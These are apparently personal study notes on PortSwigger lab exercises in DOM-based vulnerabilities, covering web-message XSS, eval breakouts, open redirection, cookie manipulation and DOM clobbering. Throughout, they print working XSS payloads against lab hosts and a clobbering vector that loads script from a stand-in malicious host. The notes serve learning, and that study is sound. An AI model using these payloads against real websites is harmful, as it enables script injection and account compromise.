## DOM-Based Vulnerabilities 

### Miscellaneous Uncs
- **Source**: A JavaScript property that allows an attacker to control data, where the untrusted input enters the application.
  - Examples: `location.search` (URL query parameters), `document.referrer`, `document.cookie`
  - Common sources:`document.URL`, `document.URI`, `document.base`, `location`,`document.cookie`, `document.referrer`, `window.name`, `history.pushState`, `history.replaceState`, `localStorage`, `sessionStorage`, `IndexedDB`, `Database`
- **Sink**: A function or a DOM object that allows code execution or renders HTML. This is where the untrusted input causes the damage.
  - Examples: `eval()`, `innerHTML`, `document.write()`
- DOM clobbering is when you inject HTML into a page to manipulate the DOm and change the behavior of the JavaScript on the site. Most common form uses an anchor element to overwrite a global variable that is used by the application in an unsafe way, such as generating a dynamic script URL. 

#### Lab: DOM XSS Using Web Messages
- Exploit server to post a message to the target site that causes the `print()` function to be called.
- When I loaded the lab, I noticed this odd `[object Object` that was appearing at the top of the homepage. I reviewed the source code, and I saw the following JavaScript. I recognized the `innerHTML` as bad immediately. So it's getting the document with element id of `ads`. Unlike the resource available at https://portswigger.net/web-security/dom-based/controlling-the-web-message-source, this is not being passed into an `eval()` function.
- The issue here is that the  event listener does not verify the origin of the message, and the postMessage() from the iframe specifies targetOrigin as *, the event listener accepts the payload and passes it into the sink.
```
<script>
                        window.addEventListener('message', function(e) {
                            document.getElementById('ads').innerHTML = e.data;
                        })
                    </script>
```
- So let's construct an iframe ... at first, I was really confused because I could not get the script tags to work. Then I found this: "The `innerHTML` sink doesn't accept `script` elements on any modern browser, nor will `svg onload` events fire. This means you will need to use alternative elements like `img` or `iframe`. Event handlers such as `onload` and `onerror` can be used in conjunction with these elements."
  - I started with `<iframe src="https://0a8b009b04034dbd81757127009a00ac.web-security-academy.net/" width="2000" height="2000" onload="this.contentWindow.postMessage('</div></div><script>print()</script>','*')">`, and then I transformed it to this: `<iframe src="https://0a8b009b04034dbd81757127009a00ac.web-security-academy.net/" width="2000" height="2000" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">` which solved the lab (resulting in the print popup window!). 
<img width="2542" height="1353" alt="image" src="https://github.com/user-attachments/assets/47ecf6a9-5ae3-4025-9725-c6f0af766487" />
- When I revisted this lab, I went with this payload
```
<iframe src="https://0ad100d3038832aa803003be0024007b.web-security-academy.net/" onload="this.contentWindow.postMessage('<audio src/onerror=print()>','*')">
```

#### Lab: DOM XSS Using Web Messages and JavaScript URL
- I knew it was a DOM-based redirection vulnerability through web messaging, so I just needed to locate it. I noticed there was comment functionality on the blog posts of the web app, so I focused there.
- The comment functionality allows a user to provide a website, which is then linked to the username. Upon pressing the username, the user is redirected to the website ... this must be where the vulnerability is. Let's take a look...wait, there's no web messaging functionality here. This must not be it. Good place to look for another lab, but let's move on ...
- Ah, I found it on the homepage...there's the sink, `location.href`, which is the full URL of the current page. We know that we need to construct an HTML page on the exploit server to solve this lab:
```

                        window.addEventListener('message', function(e) {
                            var url = e.data;
                            if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
                                location.href = url;
                            }
                        }, false);

```
- I struggled with constructing the payload here. I knew it needed to have `https:` or `http:`, and I knew it was a JavaScript URL. I attempted `<iframe src="https://0aad00b0039dc1f980ba1c2e003f00ae.web-security-academy.net/" width="2000" height="2000" onload="this.contentWindow.postMessage('javascript:print(); http:','*')">` thinking the semicolon would terminate it, but I wasn't really considering the rest of the message - the http:. What I needed to do instead was comment out the rest with JavaScript comment, `//`, to prevent a syntax error or whatever that was causing the failure on my origina attempt ... so the final payload is `<iframe src="https://0aad00b0039dc1f980ba1c2e003f00ae.web-security-academy.net/" width="2000" height="2000" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">`.
- Upon revisit, this is the payload I went with: `<iframe src="https://0a2600d103c8e3b080ab1d2600de0074.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()// http:','*')">`

#### Lab: DOM XSS Using Web Messages and `JSON.parse`
- `JSON.parse()` parses a JSON string, constructing the JS value or object described by the string. Example, `const json = '{"result":true, "count":42}'; const obj = JSON.parse(json); console.log(obj.count);` would result in 42. `obj.result` would result in true.
```

                        window.addEventListener('message', function(e) {
                            var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
                            document.body.appendChild(iframe);
                            try {
                                d = JSON.parse(e.data);
                            } catch(e) {
                                return;
                            }
                            switch(d.type) {
                                case "page-load":
                                    ACMEplayer.element.scrollIntoView();
                                    break;
                                case "load-channel":
                                    ACMEplayer.element.src = d.url;
                                    break;
                                case "player-height-changed":
                                    ACMEplayer.element.style.width = d.width + "px";
                                    ACMEplayer.element.style.height = d.height + "px";
                                    break;
                            }
                        }, false);
```
- The final payload was `<iframe src=https://0a83008804269a0380e017cb00670089.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>`. What did I learn? You need to backslash quotation marks for JSON, `\"`. I reviewed the code, and I noted that `d.url` could be provided as the JavaScript URL from the previous lab. I can see the cases to assist with the JSON keys...
- When the constructed `iframe` loads, the `postMessage()` method sends a web message to the home page with the type `load-channel`. The event listener receives the message and parses it with `JSON.parse()` before sending it to the switch.
- The switch triggers `load-channel` case, which assigns the `url` property of the message to the `src` attribute of the ACMEplayer.element `iframe`. However, in our case, the `url` property of the message was actually a JavaScript payload. 
- **Why does this happen?** The event handler does not contain any form of origin check and the second argument specifics that any targetOrigin is allowed for the web message.

#### Lab: Reflected DOM XSS
- I navigated to the Debugger, and I reviewed the JavaScript file titled 'searchResults.js'. During this time, I got distracted, and I basically forgot to examine the requests coming into Burp altogether. This would be a mistake. 
- If I had paid attention, I would've noticed my search term is displayed as part of JSON. Reviewing searchResultsjs, we see this: `eval('var searchResultsObj = ' + this.responseText);`. Reminder, XHR is XML HTTP Request which is an API in the form of a JavaScript object to transmit HTTP method requests from a web browser to a web server. 
- To break out of the JSON, I had to experiment with quotes and backslashes: `/search-results?search=\"\}test`
![alt text](<Photos/2025-08-31 21_55_27-Burp Suite Community Edition v2025.7.4 - Temporary Project.png>)
![alt text](<Photos/2025-08-31 21_56_56-Burp Suite Community Edition v2025.7.4 - Temporary Project.png>)
- Final payload ended up being `search=\"-alert(1)}//`. As the site is not escaping our injected backslask, when the JSON response attempts to escape the opening double-quotes character, it adds a second backslash. The resulting double backslash causes the escape to effectively be canceled out. This means the double-quotes are processed unescaped, which closes the string that should contain the search term. 
- An arithmetic operator, in this case a subtraction operator, is then used to separate the expressions before the `alert()` function is called. Finally, a closing curly bracket and two forward slashes close the JSON object early and comment out what would have been the rest of the object. I tried it again with another arithmetic operator, and I found it worked, `\"+alert(1)}//`. 
- eval() is dangerous because it evalutes or executes an argument.

#### Lab: DOM-Based Open Redirection
- `https://0a1900420319cd93805203df00460069.web-security-academy.net/post?postId=4&url=https://exploit-0aaf008f0383cd0e80ea02e6016500db.exploit-server.net/exploit#`

#### DOM-based Cookie Manipulation
- Based on the name, I knew I was looking for some cookie shenanigans. I noticed the value of 'lastViewedProduct' included a URL to the last viewed product (of course). So we have our source, where is our sink?
- Found it! We can see JavaScript that says the following. So I found the issue, but I'm actually a bit unsure how to craft the payload ... let's think:
```
<script>
  document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'
</script>
```
- I began with a very simple payload which did not work, and I was also informed in the lab instructions that I will need my exploit server (later): `https://0ab2002103e93f1e801f2bbb007100b5.web-security-academy.net/product?productId=6&<script>print()</script>` which was encoded into `https://0ab2002103e93f1e801f2bbb007100b5.web-security-academy.net/product?productId=6&%3Cscript%3Eprint()%3C/script%3E`.
- The issue with this payload is that it just isn't expecting to execute JavaScript here, so we need to close out this href. 
<img width="788" height="164" alt="image" src="https://github.com/user-attachments/assets/78c27ad4-694f-4b00-bfeb-a25ce4f0ac28" />
- My second payload did not work either: `"><script>print()</script>` - why? Well, I was looking at the Elements tab and not the Sources tab. The Elements tab is the DOM tree that the browser has rebuilt, and it has been tidied and changed by the browser. In the actual sources tab, we can see that they use single quotes for the `<a href>` so I need to actually close it with single quotes.
- Okie! Now that we have the very simple payload, just appending `'><script>print()</script>`, we now have to use our exploit server to deliver this to a victim. Final payload which solved the lab was:
```
<iframe src="https://0ab2002103e93f1e801f2bbb007100b5.web-security-academy.net/product?productId=4&'><script>print()</script>", width="2000" height="2000", '*'>
```

#### Exploiting DOM clobbering to enable XSS
- Technique where you inject HTML into a page to manipulate the DOM and ultimately change the behavior of the JavaScript on the page. Particularly useful in cases where XSS is not possible, but you can control some HTML on a page where the attributes `id` or `name` are whitelisted by the HTML filter. Most common form of DOM clobbering uses an anchor element to overwrite a global variable, which is then used by the application in an unsafe way, such as generating a dynamic script URL.
- A common pattern used by JavaScript developers is `var someObject = window.someObject || {};`. If you can control some of the HTML on the page, you can clobber the `someObject` reference with a DOM node, such as an anchor. Consider the following code:
```
<script>
  window.onload = function(){
    let someObject = window.someObject || {};
    let script = document.createElement('script');
    script.src = someObject.url;
    document.body.appendChild(script);
  };
</script>
```
- To exploit the above code, you could inject the following HTML to clobber the `someObject` reference with an anchor element: `<a id=someObject><a id=someObject name=url href=//malicious-website.com/evil.js`. As the two anchors use the same ID, the DOM groups them together in a DOM collection. The DOM clobbering vector then overwrites the 'someObject' reference with the DOM collection. A `name` attribute is used on the last anchor element in order to clobber the `url` property of the `someObject` object, which points to an external script.
- I got confused here in the notes about why we had to make a collection and why a singular anchor object wasn't going to work ... well, when we use two, we create a collection. HTMLCollections has a special feature where the browser searches inside the collection for an element. So for example, a singular anchor tag, like `<a id="someObject" name ="url" href="//malicious.com">`, when JavaScript runs `someObject.url`, the browser finds the ID someObject and it returns an `HTMLAnchorElement` object. The code then tries to read the property `url` on the anchor elemnt, but does the HTML anchor tag have a standard property called `url`? No, it has `href`, `host`, `search`, but not `url`. So this causes `someObject.url` 
  - Okay, now what do we do about this? Well, a collection behaves differently! Now, if we do: `<a id="someObject" <a id="someObject" name="url" href="//malicious.com">`. The browser now finds two elements with the same ID, it cannot just return one, so it bundles them into an `HTMLCollection` which is essentially an array. Now, the code tries to read the property `url` on the Collection, but `HTMLCollections` has a special feature. If you try to access a property on a collection (like `.url`), the browser searches inside the collection for an element with the `name="url"`. Browser logic is "do I have an element inside me named `url`? Yes! The second anchor."




